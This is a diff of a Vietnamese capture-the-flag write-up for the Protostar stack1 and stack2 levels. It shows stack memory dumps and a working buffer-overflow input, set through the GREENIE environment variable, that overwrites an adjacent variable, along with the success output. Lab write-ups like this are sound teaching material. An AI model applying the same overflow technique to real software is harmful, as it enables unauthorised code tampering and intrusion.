@@ -93,52 +93,37 @@ Phân biệt theo màu: <span style="color:aqua">buffer</span>, <span style="col
 
 <pre>
 0xbffff730:     0xbffff748      0xbffff9ec      0xb7fff8f8      0xb7f0186e
-0xbffff740:     0xb7fd7ff4      0xb7ec6165      <span style="color:aqua">0x6c6c6568      <span style="color:aqua">0xb7ea006f
-0xbffff750:     <span style="color:aqua">0xb7fd7ff4      <span style="color:aqua">0x08049748      <span style="color:aqua">0xbffff768      <span style="color:aqua">0x08048358
-0xbffff760:     <span style="color:aqua">0xb7ff1040      <span style="color:aqua">0x08049748      <span style="color:aqua">0xbffff798      <span style="color:aqua">0x08048549
-0xbffff770:     <span style="color:aqua">0xb7fd8304      <span style="color:aqua">0xb7fd7ff4      <span style="color:aqua">0x08048530      <span style="color:aqua">0xbffff798
-0xbffff780:     <span style="color:aqua">0xb7ec6365      <span style="color:aqua">0xb7ff1040      <span style="color:orangered">0x00000000</span>      <span style="color:yellow">0xbffff9ec</span>
+0xbffff740:     0xb7fd7ff4      0xb7ec6165      <span style="color:aqua">0x6c6c6568</span>      <span style="color:aqua">0xb7ea006f</span>
+0xbffff750:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08049748</span>      <span style="color:aqua">0xbffff768</span>      <span style="color:aqua">0x08048358</span>
+0xbffff760:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x08049748</span>      <span style="color:aqua">0xbffff798</span>      <span style="color:aqua">0x08048549</span>
+0xbffff770:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08048530</span>      <span style="color:aqua">0xbffff798</span>
+0xbffff780:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:orangered">0x00000000</span>      <span style="color:yellow">0xbffff9ec</span>
 ...
 <span style="color:yellow">0xbffff9ec</span>:     0x6c6c6568      0x4f4c006f      0x4d414e47      0x73753d45
 </pre>
 
+Để exploit được chương trình, ta sẽ gán 68 byte giá trị cho environment variable `"GREENIE"` là `"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888\0x0d0a0d0a"`
 Nếu sử dụng input như bài trước, ta sẽ sửa được giá trị của `modified` thành `0x00000078`.
 Sau đây là bộ nhớ sau `strcpy`.
-
-```bash
-stack1 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888x"
-```
+(`esp` có thể thay đổi tùy khi environment variable `"GREENIE"` thay đổi, nhưng các offset từ `esp` để tìm ra đúng biến thì giữ nguyên.)
 
 <pre>
-0xbffff6f0:     0xbffff70c      0xbffff941      0xb7fff8f8      0xb7f0186e
-0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      <span style="color:aqua">0x41414141</span>
-0xbffff710:     <span style="color:aqua">0x42424242</span>      <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>      <span style="color:aqua">0x45454545</span>
-0xbffff720:     <span style="color:aqua">0x46464646</span>      <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>      <span style="color:aqua">0x31313131</span>
-0xbffff730:     <span style="color:aqua">0x32323232</span>      <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>      <span style="color:aqua">0x35353535</span>
-0xbffff740:     <span style="color:aqua">0x36363636</span>      <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x00000078</span>
+0xbffff6f0:     0xbffff708      0xbffff9ad      0xb7fff8f8      0xb7f0186e
+0xbffff700:     0xb7fd7ff4      0xb7ec6165      <span style="color:aqua">0x41414141</span>      <span style="color:aqua">0x42424242</span>
+0xbffff710:     <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>      <span style="color:aqua">0x45454545</span>      <span style="color:aqua">0x46464646</span>
+0xbffff720:     <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>      <span style="color:aqua">0x31313131</span>      <span style="color:aqua">0x32323232</span>
+0xbffff730:     <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>      <span style="color:aqua">0x35353535</span>      <span style="color:aqua">0x36363636</span>
+0xbffff740:     <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x0d0a0d0a</span>      <span style="color:yellow">0xbffff9</span>00
+...
+<span style="color:yellow">0xbffff9ad</span>:      "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888\n\r\n\r"
 </pre>
 
-Tuy nhiên để đạt được đúng mục tiêu exploit chương trình stack1, chúng ta sẽ cần gán giá trị cho `modified` là `0x61626364`.
-4 byte giá trị này tương đương với `"dcba"` (chuỗi ngược do kiến trúc CPU dùng Little Endian).
-Sau đây là lệnh và tham số để chạy stack1 cho ra đúng kết quả mong muốn.
-
-```bash
-stack1 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888dcba"
-```
-
-Đi kèm với đó là bộ nhớ sau `strcpy` để bạn dễ tưởng tượng.
-
-<pre>
-0xbffff6f0:     0xbffff70c      0xbffff93e      0xb7fff8f8      0xb7f0186e
-0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      <span style="color:aqua">0x41414141</span>
-0xbffff710:     <span style="color:aqua">0x42424242</span>      <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>      <span style="color:aqua">0x45454545</span>
-0xbffff720:     <span style="color:aqua">0x46464646</span>      <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>      <span style="color:aqua">0x31313131</span>
-0xbffff730:     <span style="color:aqua">0x32323232</span>      <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>      <span style="color:aqua">0x35353535</span>
-0xbffff740:     <span style="color:aqua">0x36363636</span>      <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x61626364</span>
-</pre>
+Cũng lưu ý thêm, biến `variable` có 1 byte đầu tiên bị ảnh hưởng do chuỗi nhập vào là kiểu null-terminated.
+Giá trị mong đợi của nó là `0xbffff9ad`.
 
 ## Ref
 ```bash
-user@protostar:~$ stack1 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888dcba
-you have correctly got the variable to the right value
+user@protostar:~$ export GREENIE=$'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888\x0a\x0d\x0a\x0d'
+user@protostar:~$ stack2
+you have correctly modified the variable
 ```
